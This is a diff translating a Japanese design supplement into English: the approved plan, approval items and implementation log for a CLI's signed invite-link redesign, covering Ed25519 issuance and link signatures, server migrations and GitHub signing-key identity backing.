+**Extra UX round (2026-09-13 — owner's question "is there any decision that worsens the user experience")**: the rulings were re-reviewed from the experience side. There are 5 points that worsen / add friction, of which the owner accepted 4 (link length ~320 → ~530 chars, dropping raw-token acceptance, the bother of typing `--github`, degradation to the ceremony when GitHub is unreachable). The remaining 1 — "a first-time invitee's key is born inside accept, so it's unregistered on GitHub and every first pair falls to the ceremony" — was judged to need a design remedy, so one more round ran on this point only (options G ⑥–⑧ and D ④). Adopted = G ⑥ (the registration path) + D ④ (Alice-side re-waiting). G ⑦ (SSHSIG on existing SSH auth keys) is a future candidate. This round exhausted new options (G 6 rounds, D 5 rounds).
 
-**設計の上限確認(反復の打ち止め)**: 各裁定点で最後の巡に新案が出なかった。全体として **Ed25519 署名 3 本(発行・受諾・リンク)+ 既存 §2.1 LP + SHA-256** だけで構成でき、HKDF / HMAC を含め新しいプリミティブ・新しいプロトコルは無い(原案の HKDF / HMAC も要らなくなった)。OpenSSH 符号化は表示 / 相互運用の符号化。仕様に無い暗号操作が必要になる箇所は見つからなかった。
+**Upper-bound check of the design (enumeration closed)**: the last round at each ruling point produced no new options. Overall the construction uses only **3 Ed25519 signatures (issuance / acceptance / link) + existing §2.1 LP + SHA-256** — no new primitives or protocols, including no HKDF / HMAC (the original's HKDF / HMAC are no longer needed either). The OpenSSH encoding is a display / interoperability encoding. No site needing an off-spec crypto operation was found.
 
-**正直な付記**: 裁定 H・I・L・M は初回は単巡の判断だったが、追加巡(上表)で各 1〜2 巡を足し、いずれも新案は出なかった(後から安価に変えられる点は変わらない)。裁定 G の GitHub API の挙動(エンドポイント・上限・プロキシ)は文書知識であり、本環境からは**未検証**(K0 で実測する)。
+**Honest note**: rulings H, I, L, M were single-round judgments in the first pass; the extra rounds (table above) added 1–2 rounds each, and none produced new options (the "cheaply changeable later" points are unchanged). Ruling G's GitHub API behavior (endpoint, limits, proxy) is documented knowledge, **unverified** from this environment (measured in K0).
 
-#### 21-3. 実装分割と人間レビュー箇所(承認後 — KL3 の K1〜K6 に倣う)
+#### 21-3. Implementation split and human-review sites (post-approval — modeled on KL3's K1–K6)
 
-| 段 | 内容 | 概算 | 人間レビュー |
+| Stage | Content | Estimate | Human review |
 |---|---|---|---|
-| IV-K0 スパイク(使い捨て・所有者の手元) | `GET /users/{login}/ssh_signing_keys` の応答形・無認証上限・`HTTPS_PROXY` 下の Bun fetch、`gh ssh-key add --type signing` の実物 | 0.5 日 | 結果の読み合わせ(docs/notes/spike-iv2.md) |
-| IV-K1 仕様 | iv-spec-drafts.md を正本へ(CRYPTO_SPEC 0.10-draft §6.3 (a) / §6.5 / §11 / §14.3、AUTH_SPEC 0.22-draft §15、AUDIT_SPEC 1.7-draft §3.2)。Status 行に KL3 と同じ書式で追記 | 0.5 日 | 承認そのもの |
-| IV-K2 crypto + ベクター | `invite-accept-signature.json` の再生成と `invite-link.json` を**先に**コミット → `invite-accept-sign.ts`(v2 + 共同署名)、新規 `invite-link.ts`(種 → 鍵ペア、発行署名、OpenSSH 符号化 / 解析)。公開 API は `index.ts` の §6.5 群 | 2 日 | **必須**(packages/crypto) |
-| IV-K3 サーバー | 追加型マイグレーション(`link_pub` UNIQUE / `head_hash` / `head_seq` / `issue_signature` / `link_signature`)、api-schema(発行 body / 応答・受諾 body・一覧行)、`handlers-invites.ts` の判定順とクライアント採番 id の 409、`@cloudflare/vitest-plugin` テスト(lsig 偽造・link_pub 移植・旧行の受諾不能・strict 拒否) | 2 日 | 判定順、旧行の扱い |
-| IV-K4 CLI ①(IV1) | `invite-link.ts` v2 の組み立て / 解釈、`invite create`(id 採番・種生成・発行署名・発行文の送信・ピン v2〔`linkPubHex` / `expectedGithubLogin`〕)、`invite accept`(発行署名検証・共同署名・生トークン経路の削除・`--from`)、`member add`(発行文の自己検証 → ピン突合 → lsig → asig → 充足形の分岐)、`context.ts` のアンカー検査拡張(`is` の一致)、`invite list` の表示 | 3 日 | 充足形の分岐(fail-closed の定義どおりか)、Redacted 規律(`k` は Redacted のまま表示直前だけ剥がす) |
-| IV-K5 CLI ②(IV2) | `github-signing-keys.ts`(HttpClient・解析・失敗の型付け)、`key publish [--gh]`、`identityBacking` 設定、`invite create --github` / `member add --github` / `invite accept --from`、儀式へのフォールバック文言、**登録の導線**(裁定 G ⑥: accept 完了表示の置き換え・鍵生成直後の「登録しますか」・再生成後の再登録案内)、**未登録時の二択**(裁定 D ④: 頼んで再実行 / 今すぐ儀式) | 2.5 日 | **CLI 初の github.com への問い合わせ**(送る情報が login だけであること、失敗が fail-closed であること) |
-| IV-K6 docs + 実装録 | 新ページ `/docs/invite-a-teammate`(Alice / Bob の 2 段・`key publish`・フォールバック儀式・`identityBacking`)、getting-started の Next steps から導線、ROADMAP IV 行、本補足に実装録 | 1 日 | — |
+| IV-K0 spike (throwaway, on the owner's machine) | `GET /users/{login}/ssh_signing_keys` response shape, unauthenticated limit, Bun fetch under `HTTPS_PROXY`, the real `gh ssh-key add --type signing` | 0.5 day | Read the results together (docs/notes/spike-iv2.md) |
+| IV-K1 spec | Reflect iv-spec-drafts.md into the primary documents (CRYPTO_SPEC 0.10-draft §6.3 (a) / §6.5 / §11 / §14.3, AUTH_SPEC 0.22-draft §15, AUDIT_SPEC 1.7-draft §3.2). Append to the Status lines in the same format as KL3 | 0.5 day | The approval itself |
+| IV-K2 crypto + vectors | **First** commit the regeneration of `invite-accept-signature.json` and the new `invite-link.json` → `invite-accept-sign.ts` (v2 + joint signature), new `invite-link.ts` (seed → keypair, issuance signature, OpenSSH encode / parse). Public API is `index.ts`'s §6.5 group | 2 days | **Required** (packages/crypto) |
+| IV-K3 server | Additive migration (`link_pub` UNIQUE / `head_hash` / `head_seq` / `issue_signature` / `link_signature`), api-schema (issuance body / response, acceptance body, list row), `handlers-invites.ts` decision order and the 409 for client-assigned ids, `@cloudflare/vitest-plugin` tests (forged lsig, transplanted link_pub, old-row acceptance refusal, strict rejection) | 2 days | Decision order, handling of old rows |
+| IV-K4 CLI ① (IV1) | `invite-link.ts` v2 assembly / parsing, `invite create` (id assignment, seed generation, issuance signature, sending the issuance, pin v2〔`linkPubHex` / `expectedGithubLogin`〕), `invite accept` (issuance-signature verification, joint signature, removal of the raw-token path, `--from`), `member add` (self-verify the issuance → pin comparison → lsig → asig → satisfaction-form branch), `context.ts` anchor-check extension (`is` match), `invite list` display | 3 days | The satisfaction-form branch (does it match the fail-closed definition), the Redacted discipline (`k` stays Redacted until just before display) |
+| IV-K5 CLI ② (IV2) | `github-signing-keys.ts` (HttpClient, parsing, typed failures), `key publish [--gh]`, the `identityBacking` setting, `invite create --github` / `member add --github` / `invite accept --from`, fallback-to-ceremony wording, **the registration path** (ruling G ⑥: replace the accept-completion message, "register?" right after key generation, re-registration guidance after regeneration), **the two-choice stop when unregistered** (ruling D ④: ask and retry / ceremony now) | 2.5 days | **The CLI's first query to github.com** (that only a login is sent; that failures are fail-closed) |
+| IV-K6 docs + implementation log | New page `/docs/invite-a-teammate` (Alice / Bob's 2 stages, `key publish`, the fallback ceremony, `identityBacking`), an inbound link from getting-started's Next steps, the ROADMAP IV row, an implementation log in this supplement | 1 day | — |
 
-順序: K0 → K1 → K2 → K3 → K4 → K5 → K6。K1〜K4 で IV1 が完結し(儀式は残る)、K5 で儀式なしが既定になる。
+Order: K0 → K1 → K2 → K3 → K4 → K5 → K6. IV1 is complete at K1–K4 (the ceremony remains); K5 makes no-ceremony the default.
 
-#### 21-4. 所有者に承認を求める項目
+#### 21-4. Items submitted for owner approval
 
-1. **束縛の形 = リンク鍵ペア(Ed25519)+ 受諾の共同署名 + 発行文のサーバー保存**(裁定 A ③ + ⑦)。補足 18 の HKDF / HMAC 原案を置き換える。`invite_accept_signed_bytes` を v2(`link_pub_hex`、ドメイン `-v2`)にし、同一バイト列へ受諾者鍵とリンク鍵の 2 署名を付ける。招待 id はクライアント採番とし、発行文(id / K_pub / head / seq / role)と発行署名をサーバー行に置いて招待者が `member add` で自己検証する — CRYPTO_SPEC §6.5 の規範改訂(ドラフト A-2)
-2. **発行署名 `invite_issue_signed_bytes`** を新設し、受諾者側の相互確認を「発行署名の検証 + 裏付け元の照合 + `--from` / yes 1 回」にする(裁定 E ③④)。12 語は受諾者側でもフォールバックへ — §6.5 / §6.3 (a) の規範改訂(ドラフト A-1 / A-2)
-3. **明示確認の充足形に第 4 形(リンク束縛 + 裏付け元照合 = 確認入力なし)を足し既定にする**。第 1〜3 形はフォールバックとして温存。「完全 auto-pass を認めない」の文は「帳のヒットのみによる」に限定したまま、第 4 形は暗号検証 + IdP 照合による**機械確認**として区別する — §6.5(ドラフト A-2)
-4. **AUTH_SPEC §15 の改訂**(ドラフト B): 発行 body にクライアント採番の `id`・`linkPubHex`・発行文・発行署名、応答から `token` を撤去、受諾 body の 5 フィールド、リンク v2 の形式、`v=1` と生トークン受諾の廃止、`token_hash` の legacy 化(追加型マイグレーション)、旧 pending 行の受諾不能
-5. **`packages/crypto` の変更範囲と K2 のベクター方針**(裁定 K): `invite-accept-signature.json` の**再生成**(README 規約「既存ベクター不変」の意図的な例外 = 互換を捨てる裁定の写し)と `invite-link.json` 新設。OpenSSH 符号化を crypto に置く
-6. **IV2: CLI が `api.github.com` へ無認証の公開 GET を送ること**(裁定 G ①)。CLAUDE.md「テレメトリ・外部送信を一切実装しない」に対する解釈と追記案: 送るのは利用者が名指しした login だけ(値・鍵・プロジェクト・利用状況は送らない)、目的は利用者の照合、`identityBacking = none` で完全に止められる、ホストは固定。SY 系列で maruhi CLI が既にベンダー API へ利用者の指示で送信している(sync-http.ts)のと同じ「利用者が明示した相手への、利用者の目的のための通信」の枠。**推奨 = 承認**。CLAUDE.md の当該行に「(利用者が明示した相手への、利用者の目的のための通信 — 同期先・身元の裏付け元 — はテレメトリではない)」を足す
-7. **プロバイダ login の置き場所**(裁定 F): `invite create --github <login>` → 発行ピン(手元・非機密)、`invite accept --from <login>`、リンクの `il=`(フラグメントのみ)。**サーバー行・監査・チェーン・署名済み構造には書かない**
-8. **発行ピンは SHOULD のまま**(裁定 A ⑦ の帰結): IV1 の真実源は行の発行文に対する自分の発行署名であり、ピンは `linkPubHex` / role の追加突合と宛先 login の保持だけを担う。ピンの無い端末でも `member add` は成立し、宛先 login だけ `--github` で補う(対話入力は K5 実装裁定で設けなかった — 21-5)。**推奨 = 承認**
-9. **fail-closed の定義**(裁定 D): 暗号検証の失敗(`K_pub` 不一致・lsig / asig / isig)= 拒否、照合の不能(ピン無し・GitHub 未登録・オフライン・上限・login 不明・`none`)= 儀式へ
-10. **エージェント環境**: 第 4 形は儀式を含まないので `member add` はエージェント環境でも通す(意図は TTY 必須の `invite create --github` で捕捉済み。`--expect-fingerprint` 併用可)。`invite accept` は非対話で `--from <login>` を必須にする(`--inviter-fingerprint` と同じ位置)。**ADR-0016 決定 7 の表に「第 4 形は儀式ではない」を追記**(ADR 改訂として提示)
-11. **`maruhi key publish` の形**(裁定 G ④): 既定は OpenSSH 1 行 + 手順の印字、`--gh` で `gh ssh-key add --type signing`。読み取りは HTTPS 直で gh に依存しない
-17. **登録の導線と未登録時の二択**(裁定 G ⑥ / D ④ — 2026-09-13 所有者承認済み): `invite accept` の完了表示を `key publish` の案内に置き換え、鍵生成直後に `gh` があれば yes で登録、再生成後は再登録を案内。`member add` は相手の GitHub に鍵が無いとき「頼んで再実行 / 今すぐ儀式」の二択で止まる。既存 SSH 認証鍵の SSHSIG(G ⑦)は将来の裏付け元候補として記録のみ
-12. **裏付け元の設定**(裁定 H): `config.json` の `identityBacking`(`github-signing-keys` 既定 / `none`。`org-directory` は予約)
-13. **監査は不変**(裁定 J): 事件・payload とも変更なし(AUDIT_SPEC は注記と版上げのみ — ドラフト C)
-14. **残余の記載先**(裁定 L): CRYPTO_SPEC §14.3 非保証 9 + AUTH_SPEC §15-3 の「信頼できる経路」注記。H5 で脅威モデル文書へ移す
-15. **実装分割 IV-K0〜K6 と順序**(21-3)、IV1 → IV2 を別 PR、版番号 CRYPTO_SPEC 0.10-draft / AUTH_SPEC 0.22-draft / AUDIT_SPEC 1.7-draft
-16. **hosted Web は触らない**: 着地ページ不変、招待の発行 / 受諾は引き続き CLI のみ(ADR-0018 の境界どおり)
+1. **The binding form = a link keypair (Ed25519) + a joint signature on the acceptance + server storage of the issuance** (ruling A ③ + ⑦). Replaces supplement 18's HKDF / HMAC original. `invite_accept_signed_bytes` becomes v2 (`link_pub_hex`, domain `-v2`), and the same bytes carry 2 signatures — the acceptor's key and the link key. Invite ids are client-assigned; the issuance (id / K_pub / head / seq / role) and the issuance signature go on the server row, which the inviter self-verifies at `member add` — a normative revision of CRYPTO_SPEC §6.5 (draft A-2)
+2. **Add the issuance signature `invite_issue_signed_bytes`** and make the accepter-side mutual check "verify the issuance signature + compare the backing source + `--from` / one yes" (ruling E ③④). The 12 words become a fallback on the accepter side too — normative revision of §6.5 / §6.3 (a) (draft A-1 / A-2)
+3. **Add a 4th form to the satisfaction forms of explicit confirmation (link binding + backing-source comparison = no confirmation input) and make it the default**. Forms 1–3 are kept as fallbacks. The sentence "full auto-pass is not allowed" stays limited to "by book hit alone"; form 4 is distinguished as **machine verification** via crypto verification + IdP comparison — §6.5 (draft A-2)
+4. **AUTH_SPEC §15 revision** (draft B): the issuance body gains client-assigned `id`, `linkPubHex`, the issuance, and the issuance signature; the response drops `token`; the acceptance body's 5 fields; the link v2 format; dropping `v=1` and raw-token acceptance; making `token_hash` legacy (additive migration); old pending rows can't be accepted
+5. **`packages/crypto` change scope and K2's vector policy** (ruling K): **regenerate** `invite-accept-signature.json` (a deliberate exception to the README convention "existing vectors are immutable" = the reflection of the ruling discarding compatibility) and create `invite-link.json`. The OpenSSH encoding goes in crypto
+6. **IV2: the CLI sends an unauthenticated public GET to `api.github.com`** (ruling G ①). Interpretation of and suggested addition to CLAUDE.md's "implement no telemetry or outbound sends": only the user-named login is sent (no values, keys, projects, or usage), the purpose is the user's own comparison, `identityBacking = none` stops it completely, the host is fixed. It's the same frame as the SY series where the maruhi CLI already sends to vendor APIs at the user's direction (sync-http.ts) — "communication to a party the user named, for the user's own purpose". **Recommendation = approve**. Add to that CLAUDE.md line: "(communication to a party the user named, for the user's own purpose — sync destinations, identity backing sources — is not telemetry)"
+7. **Where provider logins live** (ruling F): `invite create --github <login>` → the issuance pin (local, non-secret); `invite accept --from <login>`; the link's `il=` (fragment only). **Not written to the server row, audit, chain, or any signed structure**
+8. **Issuance pins stay SHOULD** (a consequence of ruling A ⑦): IV1's source of truth is the inviter's own issuance signature against the row's issuance; the pin only carries the extra `linkPubHex` / role comparison and the destination login. `member add` still works on a pin-less device, with the destination login supplied via `--github` (no interactive input was provided — K5's implementation ruling, 21-5). **Recommendation = approve**
+9. **The fail-closed definition** (ruling D): crypto-verification failure (`K_pub` mismatch, lsig / asig / isig) = refuse; verification impossibility (no pin, GitHub-unregistered, offline, rate limit, unknown login, `none`) = fall to the ceremony
+10. **Agent environments**: form 4 involves no ceremony, so `member add` passes in agent environments (the intent is already captured at TTY-required `invite create --github`. `--expect-fingerprint` may be combined). `invite accept` requires `--from <login>` non-interactively (the same position as `--inviter-fingerprint`). **Append "form 4 is not a ceremony" to ADR-0016 decision 7's table** (presented as an ADR revision)
+11. **The shape of `maruhi key publish`** (ruling G ④): default prints the OpenSSH line + the steps; `--gh` runs `gh ssh-key add --type signing`. Reads are direct HTTPS, independent of gh
+17. **The registration path and the two-choice stop when unregistered** (rulings G ⑥ / D ④ — owner-approved 2026-09-13): replace `invite accept`'s completion message with `key publish` guidance; right after key generation, if `gh` exists, a yes registers it; after regeneration, guide to re-register. `member add` stops with the two choices "ask them / run the ceremony now" when the peer's GitHub has no keys. SSHSIG on existing SSH auth keys (G ⑦) is recorded only as a future backing-source candidate
+12. **The backing-source setting** (ruling H): `config.json`'s `identityBacking` (`github-signing-keys` default / `none`. `org-directory` reserved)
+13. **Audit unchanged** (ruling J): no change to events or payloads (AUDIT_SPEC gets only a note and a version bump — draft C)
+14. **Where the residual is recorded** (ruling L): CRYPTO_SPEC §14.3 non-guarantee 9 + AUTH_SPEC §15-3's "trusted path" note. Moved to the threat-model document at H5
+15. **Implementation split IV-K0–K6 and ordering** (21-3), IV1 → IV2 as separate PRs, version numbers CRYPTO_SPEC 0.10-draft / AUTH_SPEC 0.22-draft / AUDIT_SPEC 1.7-draft
+16. **Don't touch hosted web**: the landing page unchanged; invite issuance / acceptance remain CLI-only (per ADR-0018's boundary)
 
-承認までフェーズ 2(実装)には入らない(→ 2026-09-13 に承認済み。以下 21-5)。
+No phase 2 (implementation) until approval (→ approved 2026-09-13. 21-5 below).
 
-#### 21-5. 実装録(フェーズ 2 — 2026-09-13)
+#### 21-5. Implementation log (phase 2 — 2026-09-13)
 
-**K1(仕様反映)**: 承認と同日に 3 正本へ反映(CRYPTO_SPEC 0.10-draft / AUTH_SPEC 0.22-draft / AUDIT_SPEC 1.7-draft)+ CLAUDE.md の外部送信の解釈 + ADR-0016 決定 7 の追記。K4 で **§15-3 のリンク形式に `i=<invite_id>` を追加**した(発行署名が invite_id を覆うため、受諾側の署名再構成に要る — 起草時の見落とし。iv-spec-drafts / 21-1 の図も同時に補正)。
+**K1 (spec reflection)**: reflected into the 3 primary documents the same day as approval (CRYPTO_SPEC 0.10-draft / AUTH_SPEC 0.22-draft / AUDIT_SPEC 1.7-draft) + the CLAUDE.md outbound-sends interpretation + an ADR-0016 decision 7 addendum. At K4, **`i=<invite_id>` was added to §15-3's link format** (the issuance signature covers invite_id, needed for the accepter side to reconstruct the signed bytes — a draft-time oversight. iv-spec-drafts and 21-1's diagram were corrected at the same time).
 
-**K2(crypto + ベクター)**: `invite-accept-signature.json` の再生成(v2 — ドメイン `invite-accept-v2`、`link_pub_hex` 束縛、受諾署名 + リンク署名の併記、負例 9 + リンク署名の負例 8)と `invite-link.json` の新設(種 → 鍵ペア、発行署名の正例 + 負例 12、OpenSSH 符号化 / 解析の正例・負例)を**先行コミット**(README 規約 26 = 既存ベクター不変の意図的な例外)。実装は `internal.package/invite-accept-sign.ts`(v2 + `signInviteLink` / `verifyInviteLinkSignature`)と新規 `invite-link.ts`(`deriveInviteLinkKeyPair` = RFC 8410 PKCS#8 接頭辞 + 種の import、`signInviteIssue` / `verifyInviteIssueSignature`、`encodeOpenSshEd25519PublicKey` / `parseOpenSshEd25519PublicKey`)。裁定:
-- **ベクター `legacy-domain`** は「実装が v1 バイト列を組めない」ため、**v1 ドメインで作った有効な署名を v2 検証器に提示する**負例として定義した(旧受諾ブロックが新検証器を通らないことの固定)
-- **OpenSSH 解析は厳格**: `ssh-ed25519` のみ、base64 は標準アルファベット + 正しいパディング、3 つ目以降のフィールド(コメント)は無視、種別文字列の大文字・鍵長違い・`sk-ssh-ed25519@openssh.com` は拒否
-- エラー kind は `InviteLinkSignatureInvalid` / `InviteIssueSignatureInvalid` の 2 つを追加(core の Effect ラッパーも追随)。1143 チェック(node / workerd / Bun / browser)通過
-- **独立レビュー(2026-09-13 — 所有者の指示で独立エージェントに `packages/crypto` の差分をレビューさせた。ブロッカーなし・should-fix 2・nit 6、全件対応)**: (1) `parseOpenSshEd25519PublicKey` の非文字列入力は例外でなく `InvalidInput`(第三者 JSON の型ずれ — `decodeHex` と同じ規律)、(2) base64 は復号前に長さ(68 文字)で弾く(巨大入力を丸ごと復号しない)、(3) 発行文の `role` は §6.2 の閉集合で検査(綴り違いが別の有効な署名にならない)、(4) `verifyInviteIssueSignature` の JSDoc に「招待者側は inviter 欄を自分の鍵 / 検証済みチェーンから埋める(行から埋めない)」を明記、(5) 3 仕様書の Version 行を 0.10 / 0.22 / 1.7 に更新(Status 行だけ更新されていた)、(6) `OTHER_LINK_SEED` を `pat(0xE0)` に変更(0xD8 は chain-entries の DEK と重複していた — ベクター再生成・独立検証通過)、(7) OpenSSH 解析の拒否ケース 10 件をハーネスへ(型ずれ・33 バイト鍵・内側長さ不一致・base64url・空白・タブ・改行・巨大入力)、(8) PKCS#8 接頭辞をバイト列リテラルに(typo が空接頭辞へ劣化しない)+ 一時 JWK の `d` を捨てる旨のコメント。ついでに base64 を `btoa` / `atob`(keys.ts と同じ Web 標準経路。形の検査は先に行う)へ寄せた
+**K2 (crypto + vectors)**: the regeneration of `invite-accept-signature.json` (v2 — domain `invite-accept-v2`, `link_pub_hex` binding, acceptance signature + link signature co-located, 9 negatives + 8 link-signature negatives) and the new `invite-link.json` (seed → keypair, positive + 12 negative issuance-signature cases, OpenSSH encode / parse positive and negative) were **committed ahead** (README convention 26 = the deliberate exception to "existing vectors are immutable"). Implementation: `internal.package/invite-accept-sign.ts` (v2 + `signInviteLink` / `verifyInviteLinkSignature`) and new `invite-link.ts` (`deriveInviteLinkKeyPair` = RFC 8410 PKCS#8 prefix + seed import, `signInviteIssue` / `verifyInviteIssueSignature`, `encodeOpenSshEd25519PublicKey` / `parseOpenSshEd25519PublicKey`). Rulings:
+- **The vector `legacy-domain`** was defined as "a valid signature made under the v1 domain presented to the v2 verifier" as a negative case (pinning that old acceptance blocks don't pass the new verifier), because "the implementation can't build v1 bytes"
+- **OpenSSH parsing is strict**: `ssh-ed25519` only; base64 is the standard alphabet with correct padding; a third and further fields (comment) are ignored; uppercase type string, wrong key length, and `sk-ssh-ed25519@openssh.com` are refused
+- Error kinds: added the 2 kinds `InviteLinkSignatureInvalid` / `InviteIssueSignatureInvalid` (core's Effect wrapper follows). 1143 checks pass (node / workerd / Bun / browser)
+- **Independent review (2026-09-13 — per the owner's instruction, an independent agent reviewed the `packages/crypto` diff. No blockers, 2 should-fix, 6 nits, all addressed)**: (1) non-string input to `parseOpenSshEd25519PublicKey` is `InvalidInput`, not an exception (type drift in third-party JSON — same discipline as `decodeHex`); (2) base64 is rejected by length (68 chars) before decoding (don't decode a huge input whole); (3) the issuance's `role` is checked against §6.2's closed set (a misspelling mustn't become another valid signature); (4) `verifyInviteIssueSignature`'s JSDoc explicitly says "the inviter side fills the inviter fields from its own key / the verified chain (not from the row)"; (5) the Version lines of the 3 spec books were updated to 0.10 / 0.22 / 1.7 (only the Status lines had been updated); (6) `OTHER_LINK_SEED` changed to `pat(0xE0)` (0xD8 collided with chain-entries' DEK — vectors regenerated, independent verification passed); (7) 10 rejection cases for OpenSSH parsing added to the harness (type drift, 33-byte key, inner length mismatch, base64url, space, tab, newline, huge input); (8) the PKCS#8 prefix became a byte-literal (a typo can't degrade it to an empty prefix) + a comment noting the temporary JWK's `d` is discarded. Incidentally, base64 moved to `btoa` / `atob` (the same Web-standard path as keys.ts; shape validation happens first)
 
-**K3(サーバー)**: 追加型マイグレーション(`invitations` に `link_pub` UNIQUE / `head_hash` / `head_seq` / `issue_signature` / `link_signature`。旧 `token_hash` は legacy = SHA-256(link_pub))。api-schema は発行 body `{ id, role, linkPubHex, headHashHex, headSeq, issueSignatureHex }`(id はクライアント採番の ULID)/ 応答 `{ expiresAtMs }`(トークンは返らない)/ 受諾 body の 5 フィールド / 一覧行の `issuance`(旧行は null)+ `linkSignatureHex`。裁定:
-- **受諾の判定順** 400 → 401 → 403 → 404(未知の link_pub)→ 410(`accepted` / `revoked` / `expired` / **`unbound`** = IV 改訂前の行)→ 422(`which: "link"` → `"accept"` の順 — リンク署名を先に検証)→ CAS
-- **409 `InviteConflict { field: id | linkPub }`**: 事前 SELECT で衝突を判定し、UNIQUE 違反の握り潰しを避ける(D1 のエラーメッセージ依存のフォールバックも残す)
-- **発行署名はサーバーで検証しない**(検証者は招待者自身と受諾者 — 裁定 A ⑦)。テストは `invites-accept.test.ts` を書き直し(リンク署名の偽造・別リンク鍵・旧行の 410・strict 拒否)。671 件通過
+**K3 (server)**: additive migration (on `invitations`: `link_pub` UNIQUE / `head_hash` / `head_seq` / `issue_signature` / `link_signature`. Old `token_hash` is legacy = SHA-256(link_pub)). api-schema: issuance body `{ id, role, linkPubHex, headHashHex, headSeq, issueSignatureHex }` (id is a client-assigned ULID) / response `{ expiresAtMs }` (no token returned) / the acceptance body's 5 fields / the list row's `issuance` (null for old rows) + `linkSignatureHex`. Rulings:
+- **The acceptance decision order** 400 → 401 → 403 → 404 (unknown link_pub) → 410 (`accepted` / `revoked` / `expired` / **`unbound`** = a pre-IV-revision row) → 422 (`which: "link"` → `"accept"` in that order — the link signature is verified first) → CAS
+- **409 `InviteConflict { field: id | linkPub }`**: a pre-SELECT determines the collision, avoiding swallowing the UNIQUE violation (a fallback relying on D1's error message is also kept)
+- **The issuance signature is not verified on the server** (the verifiers are the inviter themself and the acceptor — ruling A ⑦). Tests rewrote `invites-accept.test.ts` (forged link signature, a different link key, old-row 410, strict rejection). 671 tests pass
 
-**K4(CLI — IV1)**: `invite-link.ts` v2(`#v=2&i&k&p&h&s&iu&ie&is&r[&il]&sig`。種は `Redacted` のまま組み立て、剥がすのは表示ゲート通過後の 1 箇所)。`invite create` は `openProject`(master 鍵必須 — 発行署名のため)へ移動し、手元の鍵がチェーン上の自分の鍵と違えば発行前に拒否。`invite accept` はリンクのみ(生トークン・`v=1` は usage エラー → 再発行を案内)、発行署名 → 相互確認 → 鍵生成〔未生成時〕→ 共同署名 → 受諾 → アンカー(sig 公開鍵を併置)。`member add` / `invite list` は行の発行文をチェーン導出の招待者鍵で検証(ピンに依存しない)→ ピン突合 → リンク署名 → 受諾署名 → 儀式。裁定:
-- **署名済みの p / r と応答の不一致はエラー**(旧: role は警告)
-- **アンカー検査**(`context.ts`)は FP に加えて `is` の一致を検査し、旧ピン(`inviterSigPubHex` 無し)は FP のみで通す
-- 発行ピンの真実源移行に伴い、ピン無しは note(拒否しない)
-- **旧形式の発行ピン(`tokenHashHex`)は読み飛ばす**(PR #171 Cursor Bugbot 指摘): 旧発行は受諾不能で突合材料として無価値だが、同じファイルの受諾側アンカーまで破損扱いにすると初回同期の機械照合が fail-open になり以後の書き込みも止まるため。形式不正の全体拒否は据え置き
+**K4 (CLI — IV1)**: `invite-link.ts` v2 (`#v=2&i&k&p&h&s&iu&ie&is&r[&il]&sig`. The seed is assembled while staying `Redacted`; unwrapped at exactly one place after the display gate passes). `invite create` moved onto `openProject` (master key required — for the issuance signature); if the local key differs from the inviter's own key on the chain it refuses before issuing. `invite accept` takes links only (raw tokens and `v=1` are a usage error → re-issue guidance): issuance signature → mutual check → key generation〔if ungenerated〕→ joint signature → accept → anchor (the sig public key is placed alongside). `member add` / `invite list` verify the row's issuance under the chain-derived inviter key (not pin-dependent) → pin comparison → link signature → acceptance signature → ceremony. Rulings:
+- **A mismatch between the signed p / r and the response is an error** (was: role was a warning)
+- **The anchor check** (`context.ts`) verifies `is` matches in addition to the FP; old pins (no `inviterSigPubHex`) pass on FP alone
+- With the issuance pin's source-of-truth migration, a missing pin is a note (not a refusal)
+- **Old-format issuance pins (`tokenHashHex`) are skipped** (PR #171 Cursor Bugbot point): old issuances can't be accepted so they're worthless as comparison material, but treating the same file's accepter-side anchor as corrupt too would make first sync's machine comparison fail-open and block later writes. Overall rejection of malformed format stays
 
-**K5(CLI — IV2)**: `github-signing-keys.ts`(`GET /users/{login}/ssh_signing_keys` 無認証・ホスト固定・login のみ送信・10 秒タイムアウト。結果は `match / not-registered / no-user / unavailable` の閉じた型で **CliError にしない** = 裏付け元は儀式を省く根拠にしかならない)、`key-publish.ts`(`key publish [--gh]` + 鍵生成直後の `offerGithubRegistration`)、`identityBacking`(`github-signing-keys` 既定 / `none`。誤記は既定へ倒す = 照合が消える方向へ倒さない)、`invite create --github` / `invite accept --from` / `member add --github`。サーバーは `/auth/me` に `providerLogin`(optionalKey — 自己情報のみ)を足し、リンクの `il` の材料にした。裁定:
-- **受諾者側の充足形 4**: 発行署名 OK + `is` ∈ GitHub(`il`).signing_keys → `--from` の一致で無対話、対話は login を名指しする yes。`--from` と `il` の**不一致は拒否**。エージェント環境は `--from` 必須(yes の代行はしない)。非端末は儀式へ戻る(note)
-- **招待者側の充足形 4**: 発行文・両署名 OK + 受諾鍵 ∈ GitHub(宛先).signing_keys → 確認入力なし(エージェント環境でも通す — 名指しは発行時の作為)。`--expect-fingerprint` 併用は照合に加えて要求。**未登録は二択**(対話端末 + フラグ無しのときだけ: 空応答 = 止まって「`key publish` を頼んで再実行」、yes = 儀式へ)。取得不能・`none` は note + 儀式
-- **仕様との差分(2026-09-13 所有者承認 — 仕様文言を実装に合わせた)**: `member add` の宛先 login の「対話入力」(AUTH_SPEC §15-3・21-4 項目 8 の起草)は**設けなかった** — 儀式の再入力プロンプトと混ざり、打ち間違いが別人の GitHub への問い合わせになる。宛先は `invite create --github`(ピン)か `member add --github` の明示に限る(名指しは発行時かフラグの明示的作為)。安全性の差は無く UX の差のみで、忘れた場合は `member add --github` の再実行で同じ結果になる。実装後の再検討(3 案: 仕様どおり / フラグとピンのみ / ピン無し時のみ対話)でも結論は同じ。AUTH_SPEC §15-3 / CRYPTO_SPEC §6.5 / iv-spec-drafts / 21-2 裁定 D・F / 21-4 項目 8 を同日補正
-- **機械照合の成功は指紋帳に記録しない**(裁定 D ②)。`key publish` の stdout は鍵行だけ(`| pbcopy` で使える)
-- **K0 は未実施**(本環境は api.github.com をプロキシが遮断)。前提と所有者のチェックリストは docs/notes/spike-iv2.md。GitHub の実応答で補正する箇所も同ノートに列挙
-- テスト: `identity-backing.test.ts`(問い合わせの 5 形・`key publish` / `--gh`・登録の導線・config)、invite / member-add の充足形 4 経路、ヘルプ golden。`bun run check` 通過(124 ファイル / 3105 件)
